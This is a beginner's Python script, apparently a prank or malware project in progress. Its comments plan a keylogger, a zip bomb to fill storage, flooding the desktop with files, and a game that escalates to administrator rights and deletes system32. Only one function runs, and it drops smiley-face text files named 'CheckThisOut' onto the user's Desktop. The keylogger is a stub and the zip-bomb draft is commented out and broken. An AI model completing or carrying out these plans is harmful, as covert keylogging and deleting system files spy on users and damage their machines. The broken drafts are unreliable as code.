#$ pip install keyboard ---i completely forget how to download packages in python
#import keyboard #need the keyboard for keylogging
import zipfile #need to make the zipfile compressed
import os
import random
import keyboard
#import Timer

#def writeFile(): #For every 60 seconds, create a text file which shows everything keylogged in a specific file

#Need a way to set a timer and when it hits the sendIt, then either 1. create a new file with the keylogged info or 2. overwrite the previous text file with the extra information so
#the text keeps adding

#def fileDisco: #create constant new files all over the desktop

#Create a while loop that will check over and over if all the space on the desktop is covered, and if not, then it will create a new folder (maybe with a text file with a smiley face)

#def zipBomb(): #make a zip bomb that will take up all the storage
#    f = open("ZIP.txt", "w")
#    f.write('10')
#    f.close()
#    for i in range(10):
#        f.open("ZIP.txt", "w")
#        f.write('0')
#        f.close()
 #   f.write("ZIP.txt", compress_type=zipfile.ZIP_DEFLATED)
#    os.remove("ZIP.txt")

#For loop where it will keep writing a long statement into a text file

#def zipBomb():
#    f = open("ZIP.txt", "w")
#    f.write("10")

#zipBomb()
#print('done')

def keyboardCollector():
  sendIt = 20 #Every 60 seconds, the keylogger will put the logs into a new textfile (Testing purposes: 20)
#    log = ""


def smileTime(): #Create files on the desktop that all have a smiley face in them.
    desktop = os.path.expanduser("~/Desktop") #Expands the path to the before part of the ~.
    
    for i in range(10):
        smile = random.choice(['''
  , ; ,   .-'"""'-.   , ; ,
  \\|/  .'         '.  \|//
   \-;-/   ()   ()   \-;-/
   // ;               ; \\
  //__; :.         .; ;__\\
 `-----\'.'-.....-'.'/-----'
        '.'.-.-,_.'.'
          '(  (..-'"
    ''',
'''  .   -""""""-.
   .'          '.
  /   O    -=-   \
 :                :
 |                |
 : ',          ,' :
  \  '-......-'  /
   '.          .'
     '-......-''',
'''     .-""""""-.
   .'          '.
  /   O      O   \
 :                :
 |                |
 : ',          ,' :
  \  '-......-'  /
   '.          .'
     '-......-''''']) #Make a choice between 3 smiley faces to put into the text files
        
        fileName = f"CheckThisOut{i+1}.txt" #Changes the file name in every iteration
        filePath = os.path.join(desktop, fileName) #Join the paths of the desktop path with the filename so as to create a new file every time.

        with open(filePath, "w") as file: #Using the with to replace the try/catch statement, but opens and writes to the new filePath.
            file.write(smile) #Writes the smile into the textfile.

#def wannaGame(): try to get administrator privilages and if not just run this as an administrator, but play a quick game and if they lose, then delete system32

smileTime()